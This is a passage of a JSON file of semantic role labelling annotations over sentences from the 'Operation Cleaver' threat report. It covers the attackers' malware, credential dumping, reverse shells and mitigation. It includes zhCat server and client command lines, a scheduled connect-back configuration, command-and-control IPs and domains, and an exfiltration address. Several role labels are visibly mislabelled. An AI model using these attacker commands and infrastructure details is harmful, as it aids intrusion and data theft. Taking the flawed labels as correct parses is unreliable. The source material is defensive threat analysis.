23}}}, " This gives the attackers a\n  predictable method to regain access to a compromised network if they ever lose access": {"gives": {"ARG0": {"text": "This"}, "V": {"text": "gives", "index": 1}, "ARG2": {"text": "the attackers"}, "ARG1": {"text": "a predictable method to regain access to a compromised network if they ever lose access"}}, "regain": {"ARGM-MNR": {"text": "a predictable method"}, "V": {"text": "regain", "index": 8}, "ARG1": {"text": "access to a compromised network"}, "ARGM-ADV": {"text": "if they ever lose access"}}, "compromised": {"V": {"text": "compromised", "index": 12}, "ARG1": {"text": "network"}}, "lose": {"ARG0": {"text": "they"}, "ARGM-TMP": {"text": "ever"}, "V": {"text": "lose", "index": 17}, "ARG1": {"text": "access"}}}, " After an\n Internet connection is ensured, the malware (TinyZbot) is\n dropped and executed": {"is": {"V": {"text": "is", "index": 4}}, "ensured": {"ARG1": {"text": "an Internet connection"}, "V": {"text": "ensured", "index": 5}}, "is_2": {"V": {"text": "is", "index": 12}}, "dropped": {"ARGM-TMP": {"text": "After an Internet connection is ensured"}, "ARG1": {"text": "the malware ( TinyZbot )"}, "V": {"text": "dropped", "index": 13}}, "executed": {"ARGM-TMP": {"text": "After an Internet connection is ensured"}, "ARG1": {"text": "the malware ( TinyZbot )"}, "V": {"text": "executed", "index": 15}}}, "\n \u2022\t Pivoting and exploitation techniques leveraged existing public exploits for MS08-067 and\n    Windows privilege escalations, and were coupled with automated, worm-like propagation\n    mechanisms": {"leveraged": {"V": {"text": "leveraged", "index": 5}, "ARG1": {"text": "existing public"}}, "existing": {"V": {"text": "existing", "index": 6}, "ARG1": {"text": "public"}}, "were": {"V": {"text": "were", "index": 19}}, "coupled": {"ARG1": {"text": "\u2022 Pivoting and exploitation techniques leveraged existing"}, "V": {"text": "coupled", "index": 20}, "ARG2": {"text": "with automated , worm - like propagation mechanisms"}}, "automated": {"V": {"text": "automated", "index": 22}}}, "\n  The changes made in zhCat allow for this information to be transferred with inline obfuscation and/\n  or encryption": {"made": {"ARG1": {"text": "The changes"}, "V": {"text": "made", "index": 2}, "ARGM-LOC": {"text": "in zhCat"}}, "allow": {"ARG0": {"text": "The changes made in zhCat"}, "V": {"text": "allow", "index": 5}, "ARG1": {"text": "for this information to be transferred with inline obfuscation and/ or encryption"}}, "be": {"V": {"text": "be", "index": 10}}, "transferred": {"ARG1": {"text": "this information"}, "V": {"text": "transferred", "index": 11}, "ARGM-MNR": {"text": "with inline obfuscation"}}}, "\n  Much like PVZ-In, this command and control channel communicates with the Content-Disposition\n  HTTP header, but for file data, POST data is supplied": {"is": {"V": {"text": "is", "index": 27}}, "supplied": {"ARGM-ADV": {"text": "for file data"}, "ARG1": {"text": "POST data"}, "V": {"text": "supplied", "index": 28}}}, "\n\n  We have seen Csext configured to communicate with the following servers:\n<list>\n  \u2022 78.47.102.90, Germany, srv01.microsoftwindowsupdate(dot)net\n  \u2022 174.36.195.158, Washington D.C, USA, srv01.microsoftupdateserver(dot)\n  net\n</list>\n</section>\n\n\n\n<footer>59</footer>\n\f\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n<cover>\n \n                      <heading>MITIGATION</heading>\n\n\n                  <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n\n                                                  #OPCLEAVER\n</cover>\n<footer>60</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>MITIGATION</heading>\n  If after reviewing the Indicators of Compromise (IOC) listed in Appendix A, you believe your\n  organization to be a victim of Operation Cleaver, we recommend you consider the following course\n  of action:\n\n  1": {"have": {"V": {"text": "have", "index": 1}}, "seen": {"ARG0": {"text": "We"}, "V": {"text": "seen", "index": 2}, "ARG1": {"text": "Csext configured to communicate with the following servers"}}, "configured": {"ARG1": {"text": "Csext"}, "V": {"text": "configured", "index": 4}, "ARG4": {"text": "to communicate with the following servers"}}, "communicate": {"ARG0": {"text": "Csext configured"}, "V": {"text": "communicate", "index": 6}, "ARG2": {"text": "with the following servers"}}, "following": {"V": {"text": "following", "index": 9}, "ARG1": {"text": "servers"}}, "reviewing": {"V": {"text": "reviewing", "index": 14}, "ARG1": {"text": "the Indicators of Compromise ( IOC ) listed in Appendix A"}}, "listed": {"ARG1": {"text": "Compromise ( IOC )"}, "V": {"text": "listed", "index": 22}, "ARGM-MNR": {"text": "in Appendix A"}}, "believe": {"ARGM-ADV": {"text": "If after reviewing the Indicators of Compromise ( IOC ) listed in Appendix A"}, "ARG0": {"text": "you"}, "V": {"text": "believe", "index": 28}, "ARG1": {"text": "your organization to be a victim of Operation Cleaver"}}, "be": {"ARG1": {"text": "your organization"}, "V": {"text": "be", "index": 32}, "ARG2": {"text": "a victim of Operation Cleaver"}}, "recommend": {"ARG0": {"text": "we"}, "V": {"text": "recommend", "index": 40}, "ARG1": {"text": "you consider the following course of action"}}, "consider": {"ARG0": {"text": "you"}, "V": {"text": "consider", "index": 42}, "ARG1": {"text": "the following course of action"}}, "following_2": {"V": {"text": "following", "index": 44}, "ARG1": {"text": "course"}}}, "\n\n<figure></figure>\n\n\n                                       <caption>Figure 21: The MimikatzWrapper.</caption>\n\nThe only external difference is that MimikatzWrapper also logs these results to res.txt in the\nexecuting directory": {"is": {"ARG1": {"text": "The only external difference"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "that MimikatzWrapper also logs these results to res.txt in the executing directory"}}, "logs": {"ARG0": {"text": "MimikatzWrapper"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "logs", "index": 8}, "ARG1": {"text": "these results to res.txt in the executing directory"}}, "res.txt": {"V": {"text": "res.txt", "index": 12}, "ARG2": {"text": "in the executing directory"}}, "executing": {"V": {"text": "executing", "index": 15}, "ARG0": {"text": "directory"}}}, "\n\n An attacker could set up a server instance of zhCat with the following command in order to\n enable both HTTP and XOR obfuscation:\n<list>\n                                zhcat.exe \u2013h \u2013p 1000 \u2013l \u2013x\n</list>\n The client instance could then be invoked with the following command:\n<list>\n                     zhcat.exe \u2013h \u2013p 1000 \u2013i 192.168.116.128 \u2013x\n</list>\n Once again, information can be supplied via standard input": {"could": {"V": {"text": "could", "index": 2}}, "set": {"ARG0": {"text": "An attacker"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "set", "index": 3}, "ARG1": {"text": "a server instance of zhCat"}, "ARGM-PRD": {"text": "with the following command"}, "ARGM-PRP": {"text": "in order to enable both HTTP and XOR obfuscation : Once again , information can be supplied via standard input"}}, "following": {"V": {"text": "following", "index": 12}, "ARG1": {"text": "command"}}, "enable": {"V": {"text": "enable", "index": 17}, "ARG1": {"text": "both HTTP and XOR obfuscation"}}, "can": {"V": {"text": "can", "index": 28}}, "be": {"V": {"text": "be", "index": 29}}, "supplied": {"ARGM-TMP": {"text": "Once again"}, "ARG1": {"text": "information"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "supplied", "index": 30}, "ARGM-MNR": {"text": "via standard input"}}}, " The exfiltration email address was also\n changed to TerafficAnalyzer(at)yahoo.com": {"was": {"V": {"text": "was", "index": 4}}, "changed": {"ARG1": {"text": "The exfiltration email address"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "changed", "index": 6}, "ARG2": {"text": "to TerafficAnalyzer(at)yahoo.com"}}}, " Many of their backdoors were web\n  applications, added to web servers, so commands can be executed from a browser or client able\n  to communicate with them": {"were": {"ARG1": {"text": "Many of their backdoors"}, "V": {"text": "were", "index": 4}, "ARG2": {"text": "web applications"}}, "added": {"ARG1": {"text": "Many of their backdoors"}, "V": {"text": "added", "index": 8}, "ARG2": {"text": "to web servers"}}, "can": {"V": {"text": "can", "index": 15}}, "be": {"V": {"text": "be", "index": 16}}, "executed": {"ARG1": {"text": "commands"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "executed", "index": 17}, "ARGM-DIR": {"text": "from a browser or client"}, "ARGM-ADV": {"text": "able to communicate with them"}}, "communicate": {"V": {"text": "communicate", "index": 25}, "ARG2": {"text": "with them"}}}, " WndTest starts using PHP servers for its command and control\nserver, some of which are listed as defaced sites": {"starts": {"ARG1": {"text": "WndTest"}, "V": {"text": "starts", "index": 1}, "ARGM-MNR": {"text": "using PHP servers for its command and control server"}, "ARGM-PRD": {"text": ", some of which are listed as defaced sites"}}, "using": {"ARG0": {"text": "WndTest"}, "V": {"text": "using", "index": 2}, "ARG1": {"text": "PHP servers"}, "ARG2": {"text": "for its command and control server , some of which are listed as defaced sites"}}, "are": {"V": {"text": "are", "index": 15}}, "listed": {"R-ARG1": {"text": "its command and control server"}, "ARG1": {"text": "some of which"}, "V": {"text": "listed", "index": 16}, "ARG2": {"text": "as defaced sites"}}, "defaced": {"V": {"text": "defaced", "index": 18}, "ARG1": {"text": "sites"}}}, " The Operation Cleaver team was\nobserved attempting to use NetCat to exfiltrate information as well as use it as a reverse\nconnecting shell": {"was": {"V": {"text": "was", "index": 4}}, "observed": {"V": {"text": "observed", "index": 5}, "ARG1": {"text": "attempting to use NetCat to exfiltrate information as well as use it as a reverse connecting shell"}}, "attempting": {"ARG0": {"text": "The Operation Cleaver team"}, "V": {"text": "attempting", "index": 6}, "ARG1": {"text": "to use NetCat to exfiltrate information as well as use it as a reverse connecting shell"}}, "use": {"ARG0": {"text": "The Operation Cleaver team"}, "V": {"text": "use", "index": 8}, "ARG1": {"text": "NetCat"}, "ARG2": {"text": "to exfiltrate information as/ as a reverse connecting shell"}}, "exfiltrate": {"ARG0": {"text": "The Operation Cleaver team"}, "V": {"text": "exfiltrate", "index": 11}, "ARG1": {"text": "information"}, "ARG2": {"text": "as a reverse connecting shell"}}, "use_2": {"ARG0": {"text": "The Operation Cleaver team"}, "V": {"text": "use", "index": 16}, "ARG1": {"text": "it"}, "ARG2": {"text": "as a reverse connecting shell"}}, "connecting": {"ARGM-MNR": {"text": "reverse"}, "V": {"text": "connecting", "index": 21}, "ARG1": {"text": "shell"}}}, " This was presumably done to limit antivirus detection of each individual file as\n  well as allow for dynamic updating of specific modules": {"was": {"V": {"text": "was", "index": 1}}, "done": {"ARG1": {"text": "This"}, "ARGM-ADV": {"text": "presumably"}, "V": {"text": "done", "index": 3}, "ARGM-PRP": {"text": "to limit antivirus detection of each individual file as well as allow for dynamic updating of specific modules"}}, "limit": {"ARG0": {"text": "This"}, "V": {"text": "limit", "index": 5}, "ARG1": {"text": "antivirus detection of each individual file"}}, "allow": {"ARG0": {"text": "This"}, "V": {"text": "allow", "index": 15}, "ARG1": {"text": "for dynamic updating of specific modules"}}}, " If this technique is combined with cached credential dumping, it can be used to jump\n  from computer to computer on a compromised network": {"is": {"V": {"text": "is", "index": 3}}, "combined": {"ARG1": {"text": "this technique"}, "V": {"text": "combined", "index": 4}, "ARG2": {"text": "with cached credential dumping"}}, "can": {"V": {"text": "can", "index": 11}}, "be": {"V": {"text": "be", "index": 12}}, "used": {"ARGM-ADV": {"text": "If this technique is combined with cached credential dumping"}, "ARG1": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 13}, "ARG2": {"text": "to jump from computer to computer on a compromised network"}}, "jump": {"V": {"text": "jump", "index": 15}, "ARGM-DIR": {"text": "from computer to computer on a compromised network"}}, "compromised": {"V": {"text": "compromised", "index": 22}, "ARG1": {"text": "network"}}}, "\n                            \n Operation Cleaver uses PLink to forward local RDP ports to remote SSH servers": {"uses": {"ARG0": {"text": "Operation Cleaver"}, "V": {"text": "uses", "index": 2}, "ARG1": {"text": "PLink"}, "ARG2": {"text": "to forward local RDP ports to remote SSH servers"}}, "forward": {"ARG0": {"text": "Operation Cleaver"}, "V": {"text": "forward", "index": 5}, "ARG1": {"text": "local RDP ports"}, "ARG2": {"text": "to remote SSH servers"}}, "remote": {"ARG0": {"text": "local RDP ports"}, "V": {"text": "remote", "index": 10}, "ARG1": {"text": "SSH servers"}}}, "\n\n</section>\n\n\n<footer>10</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n <heading>Indicators of Compromise (IOC)</heading>\n \u2022\t Private signing certificates of one victim were captured allowing the Operation Cleaver team to\n    compromise the entirety of their organization": {"were": {"V": {"text": "were", "index": 7}}, "captured": {"ARG1": {"text": "\u2022 Private signing certificates of one victim"}, "V": {"text": "captured", "index": 8}, "ARGM-ADV": {"text": "allowing the Operation Cleaver team to compromise the entirety of their organization"}}, "allowing": {"ARG0": {"text": "\u2022 Private signing certificates of one victim"}, "V": {"text": "allowing", "index": 9}, "ARG1": {"text": "the Operation Cleaver team to compromise the entirety of their organization"}}, "compromise": {"ARG0": {"text": "the Operation Cleaver team"}, "V": {"text": "compromise", "index": 15}, "ARG1": {"text": "the entirety of their organization"}}}, " It starts by\n  first extracting cached credentials from the infected computer\u2019s cache": {"starts": {"ARG1": {"text": "It"}, "V": {"text": "starts", "index": 1}, "ARG2": {"text": "by first extracting cached credentials from the infected computer \u2019s cache"}}, "extracting": {"ARGM-TMP": {"text": "first"}, "V": {"text": "extracting", "index": 4}, "ARG1": {"text": "cached credentials from"}}, "cached": {"V": {"text": "cached", "index": 5}}}, " The purpose of TinyZBot is to gather\n  information from an infected computer as well as maintain and further access into a compromised\n  network": {"is": {"ARG1": {"text": "The purpose of TinyZBot"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "to gather information from an infected computer as well as maintain and further access into a compromised network"}}, "gather": {"V": {"text": "gather", "index": 6}, "ARG1": {"text": "information"}, "ARG2": {"text": "from an infected computer"}}, "compromised": {"V": {"text": "compromised", "index": 21}, "ARG1": {"text": "network"}}}, " If no mutex and process\n pair was located, another TinyZBot instance would be started": {"was": {"V": {"text": "was", "index": 6}}, "located": {"ARG1": {"text": "no mutex and process pair"}, "V": {"text": "located", "index": 7}}, "would": {"V": {"text": "would", "index": 12}}, "be": {"V": {"text": "be", "index": 13}}, "started": {"ARGM-ADV": {"text": "If no mutex and process pair was located"}, "ARG1": {"text": "another TinyZBot instance"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "started", "index": 14}}}, "\n</section>\n\n<section>\n  <heading>NetC (Net Crawler)</heading>\n  Net Crawler utilizes a cached credential dumping technique along with PsExec in order to\n  worm throughout a network, collecting any and all credentials that it can extract from credential\n  caches": {"utilizes": {"ARG0": {"text": "Net Crawler"}, "V": {"text": "utilizes", "index": 2}, "ARG1": {"text": "a cached credential dumping technique/ PsExec"}, "ARGM-MNR": {"text": "along with"}, "ARGM-PRP": {"text": "in order to worm throughout a network"}, "ARGM-PRD": {"text": "collecting any and all credentials that it can extract from credential caches"}}, "worm": {"V": {"text": "worm", "index": 14}, "ARGM-DIR": {"text": "throughout a network"}}, "collecting": {"V": {"text": "collecting", "index": 19}, "ARG1": {"text": "any and all credentials that it can extract from credential caches"}}, "can": {"V": {"text": "can", "index": 26}}, "extract": {"ARG1": {"text": "any and all credentials"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "extract", "index": 27}, "ARG2": {"text": "from credential caches"}}}, " It was limited to logging keystroke data, sending emails, and creating\n a link in the user\u2019s startup folder for persistence": {"was": {"ARG1": {"text": "It"}, "V": {"text": "was", "index": 1}, "ARG2": {"text": "limited to logging keystroke data , sending emails , and creating a link in the user \u2019s startup folder for persistence"}}, "limited": {"ARG1": {"text": "It"}, "V": {"text": "limited", "index": 2}, "ARG2": {"text": "to logging keystroke data , sending emails , and creating a link in the user \u2019s startup folder for persistence"}}, "logging": {"ARG0": {"text": "It"}, "V": {"text": "logging", "index": 4}, "ARG1": {"text": "keystroke data"}}, "sending": {"V": {"text": "sending", "index": 8}, "ARG1": {"text": "emails"}}, "creating": {"V": {"text": "creating", "index": 12}, "ARG1": {"text": "a link in the user \u2019s startup folder for persistence"}}}, " They achieved complete access to airport gates and their security\n control systems, potentially allowing them to spoof gate credentials": {"achieved": {"ARG0": {"text": "They"}, "V": {"text": "achieved", "index": 1}, "ARG1": {"text": "complete access to airport gates and their security control systems"}, "ARGM-ADV": {"text": "potentially allowing them to spoof gate credentials"}}, "allowing": {"ARG0": {"text": "They"}, "ARGM-ADV": {"text": "potentially"}, "V": {"text": "allowing", "index": 14}, "ARG1": {"text": "them to spoof gate credentials"}}, "spoof": {"ARG0": {"text": "them"}, "V": {"text": "spoof", "index": 17}, "ARG1": {"text": "gate credentials"}}}, "\n\nThe following command and control servers for Logger Module have been observed:\n<list>\n212.87.154.14, Baden-Wurttemberg, Germany, kundenpflege.menrad(dot)de\n212.87.154.12, Baden-Wurttemberg, Germany, www.gesunddurchsjahr(dot)de\n</list>\n</section>\n\n<section>\n<heading>wndTest</heading>\nWndTest is the evolution of the PVZ tool chain into a single executable": {"following": {"V": {"text": "following", "index": 1}, "ARG1": {"text": "command"}}, "have": {"V": {"text": "have", "index": 9}}, "been": {"V": {"text": "been", "index": 10}}, "observed": {"ARG1": {"text": "The following command and control servers for Logger Module"}, "V": {"text": "observed", "index": 11}}, "is": {"ARG1": {"text": "WndTest"}, "V": {"text": "is", "index": 14}, "ARG2": {"text": "the evolution of the PVZ tool chain into a single executable"}}}, " It has the ability to dump stored and\n  cached credentials, and conduct attacks like ARP cache poisoning in order to capture credentials\n  being transmitted on the network": {"has": {"ARG0": {"text": "It"}, "V": {"text": "has", "index": 1}, "ARG1": {"text": "the ability to dump stored and cached credentials , and conduct attacks like ARP cache poisoning"}, "ARGM-PRP": {"text": "in order to capture credentials being transmitted on the network"}}, "dump": {"V": {"text": "dump", "index": 5}, "ARG1": {"text": "stored"}}, "stored": {"V": {"text": "stored", "index": 6}}, "cached": {"V": {"text": "cached", "index": 8}, "ARG1": {"text": "credentials"}}, "conduct": {"V": {"text": "conduct", "index": 12}, "ARG1": {"text": "attacks like ARP cache poisoning"}, "ARGM-PRP": {"text": "in order to capture credentials being transmitted on the network"}}, "capture": {"V": {"text": "capture", "index": 21}, "ARG1": {"text": "credentials being transmitted on the network"}}, "being": {"V": {"text": "being", "index": 23}}, "transmitted": {"V": {"text": "transmitted", "index": 24}, "ARGM-LOC": {"text": "on the network"}}}, "\n  This makes the traffic between zhCat instances look like benign HTTP traffic": {"makes": {"ARG0": {"text": "This"}, "V": {"text": "makes", "index": 1}, "ARG1": {"text": "the traffic between zhCat instances look like benign HTTP traffic"}}, "look": {"ARG0": {"text": "the traffic between zhCat"}, "ARGM-MNR": {"text": "instances"}, "V": {"text": "look", "index": 7}, "ARG1": {"text": "like benign HTTP traffic"}}}, "\nThey were observed conducting SQL injections, controlling backdoors, as well as exfiltrating\ninformation using this address, and the address appears in multiple software configurations\nrecovered from staging servers over a period of time": {"were": {"V": {"text": "were", "index": 1}}, "observed": {"V": {"text": "observed", "index": 2}, "ARG1": {"text": "conducting SQL injections"}, "ARGM-PRD": {"text": "controlling backdoors , as well as exfiltrating information using this address"}}, "conducting": {"ARG0": {"text": "They"}, "V": {"text": "conducting", "index": 3}, "ARG1": {"text": "SQL injections"}}, "controlling": {"ARG0": {"text": "They"}, "V": {"text": "controlling", "index": 7}, "ARGM-ADV": {"text": "backdoors"}}, "exfiltrating": {"V": {"text": "exfiltrating", "index": 13}, "ARG0": {"text": "information"}}, "using": {"V": {"text": "using", "index": 15}, "ARG1": {"text": "this address"}}, "appears": {"ARG1": {"text": "the address"}, "V": {"text": "appears", "index": 22}, "ARGM-LOC": {"text": "in multiple software configurations recovered from staging servers over a period of time"}}, "recovered": {"ARG1": {"text": "multiple software configurations"}, "V": {"text": "recovered", "index": 27}, "ARG2": {"text": "from staging servers over a period of time"}}, "staging": {"V": {"text": "staging", "index": 29}, "ARG1": {"text": "servers"}, "ARGM-TMP": {"text": "over a period of time"}}}, "\n</section>\n<footer>20</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>Shell Creator 2 (cont.)</heading>\n\n\n<figure></figure>\n\n          <caption>Figure 6: Shell Creator 2 alerts the user in red when the IP being used can be sourced to Iran.</caption>\n\n\n<figure></figure>\n\n                                          \n              <caption>Figure 7: Shell Creator 2 notifies the user in green when their source IP address is not Iran.</caption>\n\n</section>                               \n\n<section>\n  <heading>Net Crawler</heading>\n                       \n  Net Crawler is a tool developed in C# that exhibits worm-like behavior in order to gather cached\n  credentials from any and all accessible computers on an infected network": {"is": {"ARG1": {"text": "Net Crawler"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a tool developed in C # that exhibits worm - like behavior in order to gather cached credentials from any and all accessible computers on an infected network"}}, "developed": {"ARG1": {"text": "a"}, "ARGM-ADJ": {"text": "tool"}, "V": {"text": "developed", "index": 5}, "ARGM-LOC": {"text": "in C #"}}, "exhibits": {"ARG0": {"text": "a tool developed in C #"}, "R-ARG0": {"text": "that"}, "V": {"text": "exhibits", "index": 10}, "ARG1": {"text": "worm - like behavior"}, "ARGM-PRP": {"text": "in order to gather cached credentials from any and all accessible computers on an infected network"}}, "gather": {"V": {"text": "gather", "index": 18}, "ARG1": {"text": "cached credentials/ on an infected network"}, "ARGM-DIR": {"text": "from any and"}, "ARG2": {"text": "all accessible computers"}}, "cached": {"V": {"text": "cached", "index": 19}, "ARG1": {"text": "credentials"}}}, " When executed, it will capture the user\u2019s keystrokes and save\nthem to a location which PVZ bot then exfiltrates": {"executed": {"ARGM-TMP": {"text": "When"}, "V": {"text": "executed", "index": 1}, "ARG1": {"text": "it"}}, "will": {"V": {"text": "will", "index": 4}}, "capture": {"ARGM-TMP": {"text": "When executed"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "capture", "index": 5}, "ARG1": {"text": "the user \u2019s keystrokes"}}, "save": {"ARGM-TMP": {"text": "When executed"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "save", "index": 11}, "ARG1": {"text": "them"}, "ARG2": {"text": "to a location which PVZ bot then exfiltrates"}}, "exfiltrates": {"ARG1": {"text": "a location"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "PVZ bot"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "exfiltrates", "index": 20}}}, "\n\nAs part of TinyZBot\u2019s command and control protocol, files can be exfiltrated over SOAP to the\ncommand and control server": {"can": {"V": {"text": "can", "index": 11}}, "be": {"ARGM-ADV": {"text": "As part of TinyZBot \u2019s command and control protocol"}, "ARG1": {"text": "files"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "be", "index": 12}, "ARG2": {"text": "exfiltrated over SOAP"}}, "exfiltrated": {"ARGM-ADV": {"text": "As part of TinyZBot \u2019s command and control protocol"}, "ARG1": {"text": "files/ over SOAP"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "exfiltrated", "index": 13}, "ARG2": {"text": "to the command and control server"}}}, " These tools are often support tools, either\n  monitoring the activity of other tools or supplementing the function of other tools gathering\n  information during the infiltration process": {"are": {"ARG1": {"text": "These tools"}, "V": {"text": "are", "index": 2}, "ARGM-TMP": {"text": "often"}, "ARG2": {"text": "support tools"}, "ARGM-ADV": {"text": "either monitoring the activity of other tools or supplementing the function of other tools gathering information during the infiltration process"}}, "monitoring": {"ARG0": {"text": "These tools"}, "V": {"text": "monitoring", "index": 8}, "ARG1": {"text": "the activity of other tools"}}, "supplementing": {"ARG2": {"text": "These tools"}, "V": {"text": "supplementing", "index": 15}, "ARG1": {"text": "the function of other tools gathering information"}, "ARGM-TMP": {"text": "during the infiltration process"}}, "gathering": {"V": {"text": "gathering", "index": 21}, "ARG0": {"text": "information"}}}, " When executed, both applications are\n  written to a temporary directory and executed": {"executed": {"ARGM-TMP": {"text": "When"}, "V": {"text": "executed", "index": 1}}, "are": {"V": {"text": "are", "index": 5}}, "written": {"ARGM-TMP": {"text": "When executed"}, "ARG1": {"text": "both applications"}, "V": {"text": "written", "index": 6}, "ARG2": {"text": "to a temporary directory"}}, "executed_2": {"ARGM-TMP": {"text": "When executed"}, "ARG1": {"text": "both applications"}, "V": {"text": "executed", "index": 12}}}, "\n  exe ,taskkill.exe$$/F /PID {pid},00:29,00:35\n  %%\n  ##\n</list>\n  This configuration executes zhCat to connect back to srv01.microsoftwindowsupdate(dot)net (a\n  deceptive domain owned by this group with falsified Whois data attributing to Microsoft Investor\n  Relations) with XORed communication using the HTTP protocol on TCP port 443": {"executes": {"ARGM-DIS": {"text": "exe/ taskkill.exe$$/F"}, "ARG0": {"text": "{ pid},00:29,00:35/ This configuration"}, "ARGM-MNR": {"text": "% % # #"}, "V": {"text": "executes", "index": 12}, "ARG1": {"text": "zhCat"}, "ARGM-PRP": {"text": "to connect back to srv01.microsoftwindowsupdate(dot)net ( a deceptive domain owned by this group with falsified Whois data attributing to Microsoft Investor Relations ) with XORed communication using the HTTP protocol on TCP port 443"}}, "connect": {"V": {"text": "connect", "index": 15}, "ARG1": {"text": "to srv01.microsoftwindowsupdate(dot)net ("}}, "owned": {"ARG1": {"text": "a deceptive domain"}, "V": {"text": "owned", "index": 23}, "ARG0": {"text": "by this group"}, "ARGM-MNR": {"text": "with falsified"}}, "falsified": {"V": {"text": "falsified", "index": 28}}, "attributing": {"ARG1": {"text": "data"}, "V": {"text": "attributing", "index": 31}, "ARG2": {"text": "to Microsoft Investor Relations )"}}, "using": {"ARG0": {"text": "Whois"}, "V": {"text": "using", "index": 40}, "ARG1": {"text": "the HTTP protocol"}, "ARG2": {"text": "on TCP port 443"}}}, " These RDP connections can\n be used to exfiltrate information visually, as well as to remotely control the computers hosting the\n RDP servers": {"can": {"V": {"text": "can", "index": 3}}, "be": {"V": {"text": "be", "index": 4}}, "used": {"ARG1": {"text": "These RDP connections"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 5}, "ARG2": {"text": "to exfiltrate information visually , as well as to remotely control the computers hosting the RDP servers"}}, "exfiltrate": {"ARG0": {"text": "These RDP connections"}, "V": {"text": "exfiltrate", "index": 7}, "ARG1": {"text": "information visually"}}, "control": {"ARGM-MNR": {"text": "remotely"}, "V": {"text": "control", "index": 16}, "ARG1": {"text": "the computers"}, "ARGM-ADV": {"text": "hosting the RDP servers"}}, "hosting": {"ARG0": {"text": "the computers"}, "V": {"text": "hosting", "index": 19}, "ARG1": {"text": "the RDP servers"}}}, " These\nFTP servers were also observed during the infection process, as infected computers were\noften instructed to download additional files from these FTP servers, including backdoors and\npivoting tools": {"were": {"V": {"text": "were", "index": 3}}, "observed": {"ARG1": {"text": "These FTP servers"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "observed", "index": 5}, "ARGM-TMP": {"text": "during the infection process/ as infected computers were often instructed to download additional files from these FTP servers , including backdoors and pivoting tools"}}, "infected": {"V": {"text": "infected", "index": 12}, "ARG1": {"text": "computers"}}, "were_2": {"V": {"text": "were", "index": 14}}, "instructed": {"ARG1": {"text": "infected computers"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "instructed", "index": 16}, "ARG2": {"text": "to download additional files from these FTP servers , including backdoors and pivoting tools"}}, "download": {"ARG0": {"text": "infected computers"}, "V": {"text": "download", "index": 18}, "ARG1": {"text": "additional files"}, "ARG2": {"text": "from these FTP servers"}, "C-ARG1": {"text": "including backdoors and pivoting tools"}}, "including": {"ARG2": {"text": "additional/ these FTP servers"}, "V": {"text": "including", "index": 26}, "ARG1": {"text": "backdoors and pivoting tools"}}, "pivoting": {"V": {"text": "pivoting", "index": 29}, "ARG0": {"text": "tools"}}}, " This way it appears that the desired application was\n  executed, but the malware was also executed silently": {"appears": {"ARGM-MNR": {"text": "This way"}, "V": {"text": "appears", "index": 3}, "ARG1": {"text": "that the desired application was executed"}}, "desired": {"V": {"text": "desired", "index": 6}, "ARG0": {"text": "application"}}, "was": {"V": {"text": "was", "index": 8}}, "executed": {"ARG1": {"text": "the desired application"}, "V": {"text": "executed", "index": 9}}, "was_2": {"V": {"text": "was", "index": 14}}, "executed_2": {"ARG1": {"text": "the malware"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "executed", "index": 16}, "ARGM-MNR": {"text": "silently"}}}, " This command\n  runs at 00:29 in the morning, and is killed by taskkill at 00:35": {"runs": {"ARG1": {"text": "This command"}, "V": {"text": "runs", "index": 2}, "ARGM-TMP": {"text": "at 00:29 in the morning"}}, "is": {"V": {"text": "is", "index": 10}}, "killed": {"ARG1": {"text": "This command"}, "V": {"text": "killed", "index": 11}, "ARG0": {"text": "by taskkill"}, "ARGM-TMP": {"text": "at 00:35"}}}, " The resulting log is written out\nto a location where PVZ-Out can exfiltrate it to its command and control server": {"resulting": {"V": {"text": "resulting", "index": 1}, "ARG2": {"text": "log"}}, "is": {"V": {"text": "is", "index": 3}}, "written": {"ARG1": {"text": "The resulting log"}, "V": {"text": "written", "index": 4}, "ARG2": {"text": "to a location where PVZ - Out can exfiltrate it to its command and control server"}}, "can": {"V": {"text": "can", "index": 13}}, "exfiltrate": {"ARGM-LOC": {"text": "a location"}, "R-ARGM-LOC": {"text": "where"}, "ARG0": {"text": "PVZ - Out"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "exfiltrate", "index": 14}, "ARG1": {"text": "it"}, "ARG2": {"text": "to its command and control server"}}}, "\n\n Within our investigation, we had no direct evidence of a successful compromise of specific\n Industrial Control Systems (ICS) or Supervisory Control and Data Acquisition (SCADA) networks, but\n Cleaver did exfiltrate extremely sensitive data from many critical infrastructure companies allowing\n them to directly affect the systems they run": {"had": {"ARGM-LOC": {"text": "Within our investigation"}, "ARG0": {"text": "we"}, "V": {"text": "had", "index": 5}, "ARG1": {"text": "no direct evidence of a successful compromise of specific Industrial Control Systems ( ICS ) or Supervisory Control and Data Acquisition ( SCADA ) networks"}}, "did": {"ARG0": {"text": "Cleaver"}, "V": {"text": "did", "index": 34}, "ARG1": {"text": "exfiltrate/ extremely sensitive data from many critical infrastructure companies allowing them to directly affect the systems they"}}, "exfiltrate": {"ARG0": {"text": "Cleaver"}, "V": {"text": "exfiltrate", "index": 35}, "ARG1": {"text": "extremely sensitive data"}, 